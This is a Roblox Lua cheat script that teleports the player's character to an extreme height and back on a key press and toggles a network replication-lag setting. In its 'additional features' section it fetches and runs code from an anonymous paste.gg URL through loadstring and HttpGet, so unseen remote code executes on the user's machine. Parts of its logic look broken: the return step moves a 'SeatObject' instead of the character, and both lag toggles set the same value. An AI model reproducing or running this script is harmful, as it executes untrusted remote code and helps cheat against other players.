local Player = game.Players.LocalPlayer
local UserInputService = game:GetService("UserInputService")
local TeleportToggle = false
local TeleportPart = nil

local function updateCharacterReferences()
    local Character = Player.Character or Player.CharacterAdded:Wait()
    local HumanoidRootPart = Character:WaitForChild("HumanoidRootPart")
    return Character, HumanoidRootPart
end

local function createInvisiblePart(position)
    local part = Instance.new("Part")
    part.Anchored = true
    part.CanCollide = false
    part.Transparency = 1
    part.Position = position
    part.Parent = workspace
    return part
end

local function onAltPress(inputObject, gameProcessedEvent)
    if inputObject.KeyCode == Enum.KeyCode.LeftAlt then
        local Character, HumanoidRootPart = updateCharacterReferences()
        
        if not TeleportToggle then
            -- Create invisible part at current position
            TeleportPart = createInvisiblePart(HumanoidRootPart.Position)
            -- Teleport high up
            HumanoidRootPart.CFrame = CFrame.new(HumanoidRootPart.Position + Vector3.new(0, 9e9, 0))
            TeleportToggle = true
        else
            -- Teleport to the invisible part
            if TeleportPart then
                game.workspace.SeatObject.CFrame = TeleportPart.CFrame
                wait(0.3)
                -- Delete the invisible part
                TeleportPart:Destroy()
                TeleportPart = nil
            end
            TeleportToggle = false
        end
    end
end

-- Connect function to InputBegan
UserInputService.InputBegan:Connect(onAltPress)

-- Handle respawn
Player.CharacterAdded:Connect(function(newCharacter)
    TeleportToggle = false
    if TeleportPart then
        TeleportPart:Destroy()
        TeleportPart = nil
    end
    print("Character respawned. Teleportation reset.")
end)

print("Modified script loaded successfully!")

-- Additional features from the original script

_G.key = Enum.KeyCode.LeftControl
loadstring(game:HttpGet("https://paste.gg/p/anonymous/cb1c7198b269449eb8a2cf8ced061bed/files/4a98e88f82ee47388b3030a7f000b34e/raw", true))()

setting = settings().Network
local Effect = Instance.new("ColorCorrectionEffect")
Effect.Parent = game.Lighting
Effect.Saturation = 0
Effect.Contrast = 0
local toggle = false
Effect.Enabled = false

function onKeyPress(inputObject, gameProcessedEvent)
    if inputObject.KeyCode == Enum.KeyCode.RightControl then
        if not toggle then
            setting.IncomingReplicationLag = 0
            Effect.Enabled = false
            toggle = true
        else
            setting.IncomingReplicationLag = 0
            Effect.Enabled = false
            toggle = false
        end
    end
end

UserInputService.InputBegan:Connect(onKeyPress)